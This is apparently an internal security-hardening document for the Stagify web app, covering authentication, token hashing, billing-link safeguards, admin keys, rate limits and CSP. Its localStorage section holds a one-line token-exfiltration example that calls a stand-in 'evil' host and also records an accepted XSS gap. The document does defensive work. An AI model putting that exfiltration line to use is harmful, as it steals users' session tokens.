# Security model & hardening

How Stagify authenticates, protects its endpoints, and bounds abuse. This is the
rationale behind the limits in the code — change them deliberately. Related:
[`environment-variables.md`](../reference/environment-variables.md),
[`data-stores.md`](../reference/data-stores.md), [`endpoints.md`](../reference/endpoints.md).

## Authentication & accounts

Backed by SQLite (`auth-store.db`, [`lib/data/auth-store.js`](../../lib/data/auth-store.js)):

- **Passwords:** hashed with **scrypt** using a per-user 16-byte random salt, and
  stored with the cost parameters that produced them — see
  [Password hashes carry their cost](#password-hashes-carry-their-cost). Never
  stored or logged in plaintext.
- **Sessions:** random 30-day tokens, validated on each request until logout. Stored
  **SHA-256 hashed**, never raw — see [Tokens at rest](#tokens-at-rest).
- **Registration:** email-verified — a code with a **15-minute expiry** and **max 5
  verify attempts** before it's invalidated.
- **Password reset:** **single-use** tokens, hashed at rest like sessions and expiring
  after an hour; the "forgot password" flow is **non-enumerating** (it does not reveal
  whether an email exists). Completing a reset **revokes every live session** for that
  account — see [Password reset revokes sessions](#password-reset-revokes-sessions).
- **Google Sign-In:** ID tokens are verified with `google-auth-library`
  (`OAuth2Client`) against `GOOGLE_CLIENT_ID`. Disabled on staging (see below).
- **Staging requires sign-in:** `POST /api/process-image` returns `401 AUTH_REQUIRED`
  for any request without a valid session — there is **no** anonymous/"mobile UA"
  staging path (that former per-IP bypass was removed to close the IP-rotation
  cost-abuse vector).
- **Free-tier daily cap:** free accounts are capped at **`FREE_DAILY_LIMIT` (50)
  generations per UTC day**, enforced server-side **before** any paid AI call
  (`freeGenerationStatus` in `lib/data/auth-store.js`); over-cap requests get
  `429 DAILY_LIMIT_REACHED`. Pro accounts are uncapped; enterprise-domain users are
  metered and billed separately.

## Enterprise domains are a blanket grant

An active enterprise domain upgrades **every** account whose email ends in it to
`pro` (`enhanceUserWithEnterprise` → `enterpriseStore.isActiveDomain`). That makes the
domain field on `enterprise.html` a privilege-escalation surface, not just a form
field: registering `gmail.com` would hand Stagify+ to a large slice of the internet
for the price of one seat.

So **public mailbox providers cannot be registered** — free consumer providers and
common disposable services, listed with their matcher in
[`lib/data/public-email-domains.js`](../../lib/data/public-email-domains.js). Input is
normalized before matching (case, an `@` prefix, a full address, a trailing dot, a
pasted URL) and subdomains of a listed provider match too, since the buyer controls
neither `gmail.com` nor `mail.gmail.com`.

Enforced at three layers, deliberately overlapping:

1. `POST /api/enterprise/create-checkout` — `400` with code `PUBLIC_EMAIL_DOMAIN`,
   before Stripe is contacted at all.
2. `activateDomain()` — refuses to write the row, so a replayed webhook, hand-edited
   session metadata, or a subscription created directly in the Stripe dashboard
   cannot bypass the route.
3. `isActiveDomain()` — re-checks on **read**. This is the important one: it is the
   single chokepoint every plan upgrade passes through, so it neutralizes a bad row
   regardless of how it got there (the legacy `enterprise-domains.json` import,
   `importStore()` during a restore, a hand-edited DB). It looks redundant next to
   layer 2 — it isn't, and it should not be "simplified" away.

**Scope:** this list gates enterprise registration only. Ordinary signup must keep
accepting gmail/yahoo/outlook addresses — do not wire it into the auth routes.

## Stagify+ checkout: an unverified email may start a subscription, never take one over

Stagify+ is a Stripe **Payment Link**, so the only things tying a completed checkout to
an account are two query parameters that the buyer can edit
([`public/scripts/stagify-plus.js`](../../public/scripts/stagify-plus.js) appends them).
They are not equally trustworthy, and the difference is what it takes to aim one at
somebody else:

| Identifier | Why a buyer can set it | What it takes to target a victim |
|---|---|---|
| `client_reference_id` | URL parameter | The victim's `u_` + 24-hex account id — 96 bits, and nothing exposes it |
| `customer_email` | Typed at Stripe checkout; Stripe never verifies ownership | Knowing their email address |

The email fallback cannot simply be deleted: **"Start free trial" stays clickable when
signed out**, so a checkout with no reference is an ordinary purchase, and removing the
fallback would leave those buyers paying with no plan.

What it must not do is *reassign* an entitlement. Before the guard in
[`lib/data/stripe-linking.js`](../../lib/data/stripe-linking.js), checking out with a
stranger's address overwrote their `stripeCustomerId` / `stripeSubscriptionId`. Two
things followed: their billing portal opened the **buyer's** Stripe customer (invoices,
card last-4, billing address), and — the real payoff — cancelling the buyer's own trial
fired `customer.subscription.deleted` for a subscription id now recorded against the
victim, **downgrading a paying customer who is still being billed**, for the price of a
trial the attacker cancelled.

So an email match may only *start* a billing relationship:

- Refused (`email_match_would_reassign`) when the account already holds a **different
  live subscription** or an **admin comp grant** — both are entitlements the new
  subscription's buyer could later revoke.
- Allowed when it holds neither, which is the ordinary signed-out purchase, a genuine
  re-purchase after a cancellation (`subscription.deleted` clears the subscription id
  but leaves the stale customer id, so "has a customer id" would wrongly refuse), and a
  Stripe redelivery of the same checkout.
- A `client_reference_id` match relinks freely. It is not a targeting vector.

A refusal is a paid checkout that did not activate, so `stripe-webhooks.js` logs it at
**error** level with the subscription and customer ids for manual reconciliation —
deliberately louder than a routine unmapped checkout, since it is also the signature of
someone checking out in another person's name.

Covered by `test/data/stripe-linking.test.js` (the mapping rules, each refusal paired
with the allow case it must not break) and `test/services/stripe-webhooks.test.js` (the
attack as real events, through to the cancellation that used to downgrade the victim).

## Admin / log-export endpoints

The log and data-export routes (`/promptlogs`, `/authstore`, `/api/getpro`, etc.) are
guarded by the **`endpoint_key`** (note the lowercase env name):

- Compared in **constant time** (`sha256` each side, then `crypto.timingSafeEqual`) —
  no early-exit timing leak.
- Session tokens are read from the `Authorization` header / body, **never from the URL
  query string**, so they can't leak via access logs, browser history, or `Referer`.
- Responses carrying secrets/PII set `Cache-Control: no-store` and
  `Referrer-Policy: no-referrer` (`setSensitiveHeaders`).
- **Destructive admin actions are `POST`, never `GET`** — `/resetmemories`,
  `POST /api/status/reset`, `DELETE /api/hosted-images/:id`. The key guard is
  header-only, so no crawler or link prefetch can reach them either way; the verb is
  what stops a *legitimate* replay (an HTTP client retrying an idempotent GET after a
  reset connection, a devtools "replay request", a caching proxy) from wiping twice.
  A `GET` on `/resetmemories` answers `405` with `Allow: POST` and touches nothing.

### The console holds a session token, never the key

The `/admin` console used to keep `endpoint_key` in a JS closure and persist nothing,
so every page load asked for it again. It now **exchanges** the key for a scoped
session token ([`lib/data/admin-sessions.js`](../../lib/data/admin-sessions.js)):
`POST /api/admin/session` takes the key, returns a 256-bit token, and the browser keeps
that in `localStorage`. The key itself is still never persisted — it is a local inside
the sign-in request and is not even retained in memory afterwards.

The trade is only sound because the token is **strictly weaker than the key**:

| | `endpoint_key` | session token |
|---|---|---|
| Opens | every key-gated route, incl. `/api/stage-by-endpoint-key` and `POST /api/getpro` | `protectLogs` routes only — the dashboard's |
| Expires | never | 30 days, sliding on use |
| Revoke | edit the env var, redeploy | `DELETE /api/admin/session`, instantly |
| At rest | — | SHA-256 digest, like every other bearer token |

Two properties are easy to lose in a later edit, and both are tested:

- **Minting costs the key.** `POST /api/admin/session` is behind `requireEndpointKey`,
  not `protectLogs`. Behind `protectLogs` a stolen token could mint an endless supply
  of fresh ones and revoking the one you knew about would achieve nothing.
- **Rotating the key revokes every session.** Each row stores a fingerprint of the key
  that minted it and validation requires it to match the key in force. Without that,
  rotating a leaked secret would leave every signed-in browser working.

**Still header-only, and that is the reason it is not a cookie.** A cookie would ride
along automatically on cross-site requests, which would make the destructive admin
`POST`s CSRF-reachable and require `SameSite` plus a custom-header check to claw back.
A token in a header is sent only by our own `fetch`, so no crawler, `<img>`, form post
or pasted link can reach an admin route at all — the same property the key guard always
had, preserved.

### No credentials over HTTP — `exportStore` vs `exportRedacted`

`GET /authstore` serves `authStore.exportRedacted()`: users, minus credentials.
It must stay that way. `exportStore()` — the sibling that backs
migration/restore — additionally returns **password hashes and salts,
pending-registration hashes, and a row per live session / outstanding reset token
keyed to its user**. Those token keys are now SHA-256 digests rather than the
bearer values (see *Tokens at rest* below), so the payload no longer hands over
accounts by itself — but it is still every credential the system has, plus a
session→user map.

It used to be what this route returned, so the single static `endpoint_key`
was, on its own, the only thing standing between a leak and every account. The
dashboard never read a single one of those fields.

Rules:
- **Never** serve `exportStore()` over HTTP, on this route or a new one. Backup
  and rollback are the SQLite file itself (Litestream → R2), not a browser
  download.
- `exportRedacted` filters through the `ADMIN_VISIBLE_USER_KEYS` **allowlist**.
  A new admin panel that needs another column adds it there deliberately. Do not
  convert it to a denylist — `rowToUser` spreads `extra_json`, so anything parked
  there would start shipping to the browser on its own.
- Enforced by `test/data/auth-store-sqlite.test.js` (no secret survives
  redaction; unknown `extra_json` fields do not leak) and
  `test/routes/admin-route.test.js` (the route calls the redacted export and
  `exportStore` is never invoked).

### Password hashes carry their cost

A password hash is written as a self-describing string —
`scrypt$N=16384,r=8,p=1,keylen=64$<hex>` — by
[`lib/data/password-hash.js`](../../lib/data/password-hash.js), the single owner of
the format, the verifier, and the parameters.

**Why the parameters are in the value.** They used to be nowhere: the row held bare
hex, so a hash made at any cost looked identical to one made at any other. That is
fine right up to the day you want to raise `N` — at which point old and new rows are
indistinguishable, nothing can report how many accounts are still on the weak cost,
and the only migration available is forcing a password reset on every user.
Verification now reads the cost off the row it is checking, so a store can hold a
mix while accounts migrate. They live in the value rather than a column because a
hash travels through `exportStore`/`importStore`, the frozen `auth-store.json`
fallback, an R2 restore, and the short-lived `pending_registrations` row — each of
which would otherwise have to carry and re-join a parallel column that can desync.

**Raising the cost** is a one-line change to `PASSWORD_PARAMS`:

1. Bump `N` (a power of two; cost is linear in it). Every new hash — sign-up,
   password reset, and every rehash below — uses it immediately.
2. Existing rows keep verifying under their own parameters, and are **re-hashed on
   the owner's next successful sign-in**, with a fresh salt. That is the only moment
   the plaintext exists, so the migration is lazy by design: accounts that never
   sign in keep their old hash until they do.
3. `maxmem` is derived from `N` and `r`, so you do not also hit Node's 32 MB scrypt
   ceiling — the first raise past 16384 would otherwise fail with an opaque
   "memory limit exceeded" rather than simply costing more.

**The cost is also a DoS budget.** Login is unauthenticated and the memory cost is
paid per in-flight attempt, so `N` and `RL_AUTH` (40 / 15 min / IP) move together.
It sits at Node's default (N=16384, ~16 MB, ~100 ms) deliberately.

Enforced by [`test/data/password-hash.test.js`](../../test/data/password-hash.test.js)
(the envelope round-trips, a legacy bare-hex row still verifies, a row at a *different*
cost verifies under its own, and `needsRehash` is never true on a failed attempt) and
by `test/data/auth-store.test.js` (a legacy row signs in and is upgraded in place;
a failed sign-in never rewrites the row).

### Tokens at rest

Session tokens and password-reset tokens are **bearer credentials** — the string
alone authenticates, with no password step. They are therefore stored **hashed**:
[`lib/data/session-tokens.js`](../../lib/data/session-tokens.js) owns both token
tables, hashes on every write, and hashes the presented token on every lookup, so
the database holds `sha256$<digest>` and never a usable token.

This is what keeps a database read from being a mass account takeover. Password
hashes are scrypt, so the DB alone doesn't yield accounts — these two tables were
the exception, and they are the reason a leaked `/data` volume, a Litestream/R2
restore, or the frozen `auth-store.json` is now a disclosure rather than a
break-in.

Notes for anyone touching this:

- **Plain SHA-256, no salt, no stretching, and that is deliberate.** The input is
  already 32 bytes of CSPRNG output — there is no guessable keyspace for a work
  factor to slow down — and validation runs on every authenticated request, so the
  digest has to stay a fast deterministic key. Do not "upgrade" it to scrypt.
- **Write token rows only through `session-tokens.js`.** It is the single
  chokepoint; a new call site that prepares its own `INSERT INTO sessions` puts a
  raw token back on disk.
- **The `sha256$` prefix is load-bearing.** A raw token and its digest are both 64
  hex chars, so the prefix is the only way to tell stored form from raw. It makes
  the boot migration and the backup/legacy import idempotent instead of
  double-hashing, which would sign every user out.
- Enforced by `test/data/auth-store-sqlite.test.js` (raw tokens never appear in
  the tables, a stored digest is not replayable, the migration keeps existing
  sessions valid and is idempotent).

### Tokens in the browser: `localStorage`, not a cookie — accepted risk

The section above is about tokens on *our* disk. In the *browser* the session token
sits in `localStorage` under `stagifyAuthToken`
([`public/scripts/auth.js`](../../public/scripts/auth.js)), which JavaScript on the
page can read. **Any XSS in a page that runs `auth.js` is therefore full account
takeover**, not merely defacement, and the CSP does not contain it: `connectSrc` and
`imgSrc` are both `'https:'`
([`lib/http/app-middleware.js`](../../lib/http/app-middleware.js)), so a stolen token
can be posted to any HTTPS host. This is a known, accepted gap — recorded here so the
next reviewer finds the analysis instead of re-deriving it.

**Why the CSP is not the fix.** Narrowing `connectSrc` alone is theatre while
`imgSrc: 'https:'` stands — `new Image().src = 'https://evil/?t=' + token` exfiltrates
just as well, and `form-action` and top-level navigation remain besides. Both
directives are load-bearing for the Google Ads tag
([`public/scripts/gtag.js`](../../public/scripts/gtag.js) — the `googletagmanager`,
`googleadservices`, `www.google.com` and `*.doubleclick.net` measurement beacons ride
on them, as the `scriptSrc` comment in `app-middleware.js` notes), so tightening
them risks silently losing conversion data — a missed beacon domain produces no error.
An allowlist is worth doing eventually, but as defence in depth, not as this fix.

**Why it is not a one-line change.** The real fix is an `httpOnly` cookie, and the
security benefit arrives only once the browser stops holding a readable token —
cookie plumbing on its own buys nothing. Scope, measured:

- **Server: 2 read sites**, already funnelled — `getAuthUserFromRequest`
  ([`lib/services/auth-helpers.js`](../../lib/services/auth-helpers.js)) and the
  logout/me extraction in [`routes/auth.js`](../../routes/auth.js). Plus set-cookie on
  login / register-verify / google-login and clear on logout.
- **Browser: 14 files, 21 send sites**, all mechanical deletions — `fetch` already
  sends same-origin cookies by default, so removing the `Authorization` header and the
  `authToken` body field is the whole change.
- **Tests: `e2e/fixtures.js` is the only place that fakes a signed-in session**, so the
  browser suite costs one fixture, not twenty specs.
- **There are no cookies in this app today** — no `cookie-parser`, no `res.cookie`
  anywhere. This would be the first.

**The part that is easy to miss: it opens a CSRF surface.** With no auth cookie, the app
is structurally immune to CSRF today. The moment a session cookie is honoured, a
cross-site form POST carries it, so `SameSite=Lax` has to land *in the same commit* as
the cookie, not afterwards. Lax is sufficient here — both cross-site returns were
checked: Stripe → `/plus-welcome.html` is a top-level GET (Lax sends the cookie, the
user stays signed in), and Google sign-in POSTs from our own page (same-site). No
CSRF-token machinery is required.

**The server can keep accepting `Authorization: Bearer` afterwards.** Once the browser
holds nothing readable, an XSS gains nothing from that path, and it preserves the
documented affordance in [`endpoints.md`](../reference/endpoints.md) plus the existing
non-browser callers. Migrating does *not* mean removing it.

**Rollout.** Every currently signed-in user holds a `localStorage` token. Either accept
a one-off forced sign-out on deploy, or add a one-time boot exchange (POST the old
token, receive the cookie, clear `localStorage`) and delete that path a month later.

### Password reset revokes sessions

`completePasswordReset` ([`lib/data/auth-store.js`](../../lib/data/auth-store.js))
rotates the scrypt hash, drops the account's reset tokens, **and deletes every row in
`sessions` for that `user_id`** — all in one transaction, so the new password and the
revocation can never diverge.

The revocation is the point of the flow, not a courtesy. A reset is what someone does
when they believe another party is in their account, and a session token is a bearer
credential with a 30-day life: rotating the password alone would leave a stolen cookie
working for up to a month after the one action the user was told to take. Sessions are
plain DB rows re-read by `validateSession` on every request — there is no in-memory
cache — so the delete takes effect immediately, across every device and process.

Notes for anyone touching this:

- **Signing the user out of their other devices is intended**, not a regression to
  paper over. `POST /api/auth/reset-password` returns a bare `{ ok: true }` and mints
  no session, so the user is already headed to the login page.
- **`dropSessionsForUser` is keyed by `user_id`, so it does not hash its argument** —
  unlike its neighbours in `session-tokens.js`, which all take raw tokens. That
  asymmetry is correct; don't "fix" it by wrapping the id in `hashToken`.
- Enforced by `test/data/auth-store.test.js` ("password reset revokes every existing
  session for that user"): two sessions for the victim both die, and a third user's
  session survives — that last assertion is what catches a `DELETE` that loses its
  `WHERE user_id`.

A **"your password was changed" notice** is emailed to the account owner on success
(`renderPasswordChangedEmail`, sent from the route). That mail is the flow's only
channel back to the real owner — every other step is driven by whoever holds the
mailbox link — so it is how someone learns about an attacker-initiated reset. It is
sent **best-effort**: the password is already changed and the sessions already revoked
by the time it goes out, so a delivery failure is logged and the response is still
`{ ok: true }`. Failing the request there would tell the user their reset didn't work
when it did, and send them round the loop again.

**Not done:** the reset UI itself doesn't mention that other devices were signed out —
only the email says so.

**Still open:** `endpoint_key` remains a single, non-rotating, process-wide
secret with no per-admin identity and no audit trail, and it also guards the CSV
exports (customer emails, prompt text) and mutating routes like
`/api/admin/grant-plus`. Redacting `/authstore` removed the worst blast radius;
it did not fix the admin auth model. `RL_ENDPOINT_KEY` (below) now bounds how fast
that secret can be *guessed*, which is a different problem from the one above —
it does nothing about rotation, identity, or audit.

Admin sessions (above) chip at the same corner without closing it: what a browser
holds day to day is now revocable and scoped, and rotating the key really does log
everything out. The key behind them is still one static secret shared by whoever has
it, so **identity and audit remain unsolved** — a session tells you a browser was
signed in, not who was at it.

## Client share links — the one anonymous read surface

`/s/:token` and `/api/share/:token` ([`routes/share-public.js`](../../routes/share-public.js))
are the only part of the gallery reachable without an account. **The token in the path is
the entire credential**, and everything else follows from that.

**The token is generated exactly like a session token.** 32 bytes of CSPRNG, base64url,
hashed with the same `hashToken` from
[`session-tokens.js`](../../lib/data/session-tokens.js) — the digest is the lookup key, so
`resolveShare` never scans.

**It is ALSO stored in plaintext, deliberately, and every finished render has one.** Both
halves of that reverse an earlier posture and are argued in the header of
[`gallery-shares.js`](../../lib/data/gallery-shares.js). The owner has to be able to reopen
their gallery next week and copy the link they already sent, which a write-only credential
cannot do; and since there is no create button, the link exists whether or not it was ever
sent to anyone. The cost is bounded and stated: anything that can read the database can
read live share URLs for the whole gallery. These tokens **authenticate nothing** — they
name one staged photo and the agent's own contact details — and session and password-reset
tokens stay digest-only, with a test in
[`gallery-shares.test.js`](../../test/data/gallery-shares.test.js) asserting they never
gain a plaintext column. The proper fix is encrypting that column with a key from the
environment; this app has no general-purpose server secret today, and a key stored on the
volume it protects buys nothing.

**One 404 for everything.** `resolveShare` reports *why* it refused (unknown / revoked /
expired), and the route throws that away on purpose. Unknown, revoked, expired,
cross-tenant, deleted and not-yet-uploaded all answer the same status, the same body and
the same headers. A surface that distinguishes them is a slow oracle over the token
keyspace. The page route goes further and performs **no lookup at all**, so its response
cannot vary by token even in timing.

**`Referrer-Policy: no-referrer` is security here, not hygiene.** The token is in the
path, and the page loads images from an R2 origin — without it, every image request would
hand the live credential to Cloudflare in a `Referer` header.

**Tenancy is one `===`.** A render is servable only after the token resolves to a share
*and* the row's `user_id` matches that share's. Without that comparison any live link
would serve any customer's pixels.

**The manifest is an allowlist by construction** — built field by field, never a row
spread, so `user_id`, storage keys, the model name and internal timestamps cannot leak
the day somebody adds a column.

**A TAKEDOWN IS DELETING THE RENDER — there is no off switch.** Owners do not create links
and cannot revoke them; the listing mints one per finished render and the panel copies it.
Deleting the entry stops the manifest at once and tombstones the bytes, which is the
stronger of the two things revoke used to do. `revoked_at` is still read on every resolve,
because deletes write it.

**And it is EVENTUAL for bytes, which is a real limitation.** Reads bypass this process
entirely (presigned R2 URLs, so a viewer's bytes never touch the Node event loop), which
means a URL already handed out works until it expires — at most 15 minutes. A presigned
URL to a deleted object 404s regardless of signature, so the delete is what closes it.
**UI copy must say "within 15 minutes"**; a test asserts the word "immediately" does not
appear on the gallery page. Instant cutoff would need a Cloudflare Worker in front of the
bucket.

**Object keys embed no account id** (`renders/<renderId>/after.webp`). A presigned URL is
handed to a stranger, and `blob_tombstones` holds keys after the owning row is gone — an
id in the key would leak through both, and would make the tombstone queue itself a record
of erased people.

## Rate limiting

`express-rate-limit`, tunable via env (see the env doc):

| Limiter | Default | Applies to |
|---|---|---|
| `RL_AUTH` | 40 / 15 min | sign-in / account actions (brute-force) |
| `RL_EMAIL` | 6 / 15 min | anything that sends email (spam/abuse) |
| `RL_GEN` | 60 / 5 min | paid AI generation (cost abuse) |
| `RL_VALIDATE_IMAGE` | 20 / 5 min | `POST /api/validate-image` — each accepted call spends a paid vision request |
| `RL_CHECKOUT` | 10 / 60 min | `POST /api/enterprise/create-checkout` (see below) |
| `RL_ENDPOINT_KEY` | 10 / 15 min | **wrong** endpoint-access keys (see below) |
| `RL_SHARE` | 60 / 15 min | `/s/:token` + `GET /api/share/:token` — the **only** anonymous read surface, so this doubles as the ceiling on guessing a token |
| `RL_GALLERY` | 120 / 15 min | the signed-in gallery's own reads and writes |
| `RL_GALLERY_IMPORT` | 20 / 15 min | `POST /api/masking-studio/save` — the one endpoint that PUTs client-supplied megabytes to object storage with no model call to brake it |
| `RL_STAMP_IMAGE` | 30 / 15 min | `POST /api/stamp-image` (Pro-only badge stamping of a browser-built composite) |
| `RL_DOWNLOAD_RESULT` | 60 / 15 min | `POST /api/download-result` — CPU-only resize/re-encode, not a paid-generation cap |
| `RL_DISCLOSURE_PREVIEW` | 120 / 5 min | `GET /api/disclosure-preview`, unauthenticated |

Two of them are **write-ceilings, not rate limits**: `RL_EMAIL_PIXEL` (120 / 15 min, the
email open-tracking pixel) and `RL_REFERRAL` (120 / 15 min, campaign short-URLs). Both sit
on unauthenticated endpoints that must still answer — a real image, a real redirect — so
going over drops only the row that would have been logged rather than returning 429. That
is also why `rejectingLimiter` (which records every refusal to `rejection_logs.csv`)
deliberately excludes them: they never refuse anything.

### The endpoint-key limiter counts rejections, not requests

The whole admin surface — every CSV export, `/authstore`, comp grants, GDPR erasure —
plus `POST /api/stage-by-endpoint-key` sits behind one shared static secret with no
accounts behind it. Guessing that secret is therefore the only way in, and nothing
bounded the guess rate. The dashboard does show a lockout after a few bad tries, but
that counter lives in the browser ([`public/scripts/admin.js`](../../public/scripts/admin.js)),
so it protects nobody who skips the page and posts the header directly.

Two design points worth not undoing:

- **It counts only rejected attempts.** The limiter runs on the guards' failure path
  only, so a request carrying the right key never touches the bucket. That is what
  lets the ceiling be as low as 10: an operator working in the dashboard cannot
  rate-limit themselves no matter how many requests the page makes. A limiter mounted
  as ordinary middleware on `routes/admin.js` would count *every* request and would
  have to be loose enough to be useless. The 500 "key not configured" path doesn't
  count either — that is our misconfiguration, not somebody guessing.
- **Both guards share ONE limiter instance.** `protectLogs` and
  `stagingEndpointKeyGuard` check the same secret, so two buckets would hand an
  attacker double the budget for alternating between an admin route and the staging
  endpoint.

It lives in [`lib/http/http-guards.js`](../../lib/http/http-guards.js) rather than on a
router for the same reason: the guard is the only place that knows a key was actually
*rejected*, and it is the one chokepoint every route holding the secret passes through.
Imported directly (as `checkoutLimiter` is) so an omitted dep cannot leave the key
unguarded; the `endpointKeyLimiter` dep is a **test seam only**, and `null` mounts the
real one. Guarded by
[`test/http/endpoint-key-limit.test.js`](../../test/http/endpoint-key-limit.test.js).

### The enterprise checkout is public on purpose

`POST /api/enterprise/create-checkout` takes **no session**: a company buys the plan
before anyone on it has an account, so there is nothing to authenticate. That makes
`checkoutLimiter` (`RL_CHECKOUT`, per IP) the only thing bounding it, and it covers
two distinct abuses:

- **Stripe-session spam** — every accepted request creates a real Checkout Session.
- **Customer enumeration** — the duplicate-domain branch answers differently from a
  fresh domain, so an unlimited endpoint would be a lookup service for "is *company.com*
  a Stagify enterprise customer?". The 409 no longer *says* so (it reads "not available
  for self-serve checkout … contact support"), but the branch is still distinguishable;
  the limiter is what makes probing a domain list impractical, not the wording.

Unlike the other limiters, `checkoutLimiter` is imported by
[`routes/billing.js`](../../routes/billing.js) directly rather than taken from the
`server.js` dep bag, so an omitted dep cannot leave the endpoint unlimited. The
`checkoutLimiter` dep is a **test seam only**; passing `null` mounts the real one.
Guarded by [`test/routes/billing-checkout-limit.test.js`](../../test/routes/billing-checkout-limit.test.js).

## Request-size & DoS hardening

The body parsers are the cheapest DoS surface, so they're **scoped**, not global:

- **JSON (`express.json`):** app-wide limit is **1 MB**; only the routes that legitimately
  carry base64 images in JSON get **25 MB**, and the allow-list is
  `JSON_LARGE_LIMIT_PATHS` in `lib/http/app-middleware.js` — currently `/api/chat`,
  `/api/mask-edit`, `/api/segment`, `/api/validate-image`, `/api/masking-studio/save`,
  `/api/stamp-image`, `/api/download-result`. The last three are the browser-composited
  paths: those images are built on a canvas and exist only client-side, so they reach the
  server at full resolution or not at all. Note the set is matched on `req.path` with a
  trailing slash stripped — Express routes non-strictly, so without that `POST /api/chat/`
  would reach the 25 MB handler through the 1 MB parser and 413 before the handler ran.
  `/api/bug-report` is
  deliberately **not** among them — it is unauthenticated and appends its body to
  `bug_reports.csv` on the same persistent volume as `auth-store.db`, so it keeps the
  1 MB limit *and* clamps every field it stores (`lib/http/bug-report-row.js`), with an
  absolute size ceiling on the file as a backstop. This matters
  because the parser runs before the per-route limiters and `JSON.parse` is
  **synchronous** — a large body on any path would otherwise buffer + block the event
  loop. Guarded by [`test/server/json-body-limit.test.js`](../../test/server/json-body-limit.test.js).
- **Multipart uploads (`multer`, memory storage):** each file is buffered whole in
  RAM, and `.fields()`/`.array()` multiply the cap by the file count, so the caps are
  kept tight:
  - staging (`process-image`, `stage-by-endpoint-key`): **25 MB**/file (×6 max)
  - `chat-upload`: **20 MB**/file (×5) + 25 MB history field
  - `host-image`: **25 MB**
  - Over-cap uploads return a clean **413** (the multer error handler sits *after* the
    routers — a subtle bit; if moved before them it silently regresses to 500).
    Guarded by [`test/server/upload-limits.test.js`](../../test/server/upload-limits.test.js).

> Photos are downscaled to 1920×1080 after receipt, so these caps are already far
> above any real upload. If a legit user hits a 413, raise the specific cap — don't
> widen the global JSON limit.

## Error responses (no stack-trace leak)

Route handlers are async, and on **Express 4** an unhandled rejection would otherwise
either hang the request or fall through to Express's built-in handler — which, when
`NODE_ENV` isn't `production`, renders the full **stack trace** to the client. Two layers
prevent that information leak:

- Every router is built with **`createAsyncRouter()`** ([`lib/http/async-router.js`](../../lib/http/async-router.js)),
  which funnels any escaped async rejection to `next(err)`.
- A **final catch-all** in `server.js` (after the Sentry hook) returns a generic
  `{ error: 'Internal server error' }` `500` — the stack trace is logged server-side (and
  captured by Sentry), never sent to the client. Guarded by
  [`test/http/async-router.test.js`](../../test/http/async-router.test.js).

That covered errors that *escaped* a handler. Errors a handler **caught** used to leak
anyway: `sendError(res, 500, 'X failed', { details: error.message })` was the house style
at ~19 sites across `routes/` and `lib/`, so whatever `sharp`, the Gemini/OpenAI SDKs,
`better-sqlite3`, `fs` or Stripe wrote into `.message` went straight to the caller —
absolute server paths, table and column names, model/quota state, upstream prose, and (on
the public Stripe webhook) which half of a signature check a forger had got wrong.

5xx bodies now carry a **reference** instead: `reportError(context, err)`
([`lib/http/error-ref.js`](../../lib/http/error-ref.js)) logs the error whole under a random
8-char id and returns just that id, so the client sees `{ error, ref }`. The reference is
random rather than derived, so it describes nothing about the failure and cannot be probed;
the operator greps it to find the exact log line. Support is better off than before — a
bare message had no request context and could not be located in the logs at all.

The one-time cleanup is not the protection; the guard is.
[`test/http/error-leak.test.js`](../../test/http/error-leak.test.js) reads the source of every
response-building call in `routes/` and `lib/` and fails the build if `.message` or
`.stack` appears inside one. Multer's `400`s are allowlisted by exact snippet: its fixed
message table ('File too large', 'Unexpected field') describes the caller's own upload and
is written in this repo, not produced by a runtime exception.

## Transport & headers

- **CSP** via `helmet`, tuned for the third parties the app loads (Google, Stripe,
  Supademo/Instagram embeds, the HEIC WASM worker).
  - **`script-src` carries no `'unsafe-inline'`.** All page JS lives in external files
    under `public/scripts/` — there are no inline `<script>` blocks or `on*=` handlers
    left — so the policy genuinely blocks injected script (the core XSS defence). Keep
    it that way: any new client-side JS goes in a file, never inline. Small former
    inline snippets were extracted to dedicated files (e.g. `footer-year.js`,
    `hover-glow.js`, the two page auth-gates); mark hookup points with a `data-*`
    attribute (`data-hover-glow`, `data-print`) and bind in the external script.
  - **`style-src` still allows `'unsafe-inline'`.** The pages carry many inline
    `style=""` attributes, so this stays for now — a deliberately accepted, lower-severity
    gap (CSS injection, not JS execution).
  - Toggle the whole policy with `DISABLE_CSP=1` only to debug a blocked resource.
    It drops the policy for **every** response, so it is not silent: boot logs a
    `[security] DISABLE_CSP=1 …` **warning** (`applyEdgeMiddleware` in
    `lib/http/app-middleware.js`). If you see that line in a deploy's logs, the site is
    running with no CSP and the flag needs unsetting — grep for it when auditing an
    environment, since the flag leaves no other trace in the responses.
- **CORS** restricted to the `ALLOWED_ORIGINS` allow-list (defaults to the stagify.ai
  origins + `localhost:3000`).

## File-upload safety

- Staging and host uploads use **type `fileFilter`s** (images → jpeg/png/webp).
  **`host-image` deliberately rejects SVG** — an SVG can carry script and would
  execute on our own origin.
- `chat-upload` intentionally accepts **all** types (the AI handles unsupported ones) —
  a known trade-off; it's still size-capped at 20 MB/file.

## Secrets

- `.env` and the `*.txt` key files are **gitignored**; the server reads the env var
  first, then the file. Production secrets live in the **Render dashboard**
  (`sync: false`), never in the repo. Full list: the env doc.
- Sentry runs with **`sendDefaultPii: false`** — no cookies, auth headers, or client IP
  are sent.

## Staging safety

When `IS_STAGING` is on, **Google Sign-In and Stripe checkout are disabled** and a
staging banner is shown, so a staging deploy can't mint real sessions or take real
payments. Ensure production does **not** set `IS_STAGING`. (See
[`deployment.md`](../operations/deployment.md).)

## Sensitive data at rest

- `auth-store.db` — password hashes + session tokens.
- The CSV logs and the `memories` table (in `auth-store.db`) — emails, IPs, chat content.

All live on the `/data` disk ([`data-stores.md`](../reference/data-stores.md)); the
export endpoints that read them are `endpoint_key`-gated.

### Erasure (the right to be forgotten)

`POST /api/admin/delete-user` is the erasure path — it backs the "request account
deletion" line in the privacy policy, which previously had nothing behind it.

The thing to understand before touching it: **this database has no foreign keys**, so
a `DELETE FROM users` cascades to nothing. The satellite rows that would survive are
not inert — `sessions` holds a **live bearer token** for an account that no longer
exists, and `memories` holds chat content keyed to an id that can no longer be
resolved back to a person if they ask again. The full table set therefore lives in one
place, [`lib/data/user-deletion.js`](../../lib/data/user-deletion.js), runs in a single
transaction, and is enforced by a schema-introspecting drift test that fails the build
when a new user-keyed table or CSV log appears uncovered.

Two deliberate refusals:
- An account with a **live Stripe subscription** is rejected (`ACTIVE_SUBSCRIPTION`).
  Erasing it would keep the card being charged with nothing left to link the charge
  to, and the cancellation webhook would no longer find a user. Cancel in Stripe
  first; `force: true` is for when that has already been done.
- The CSV logs are **redacted, not pruned** — see the storage doc for why row counts
  have to stay put.

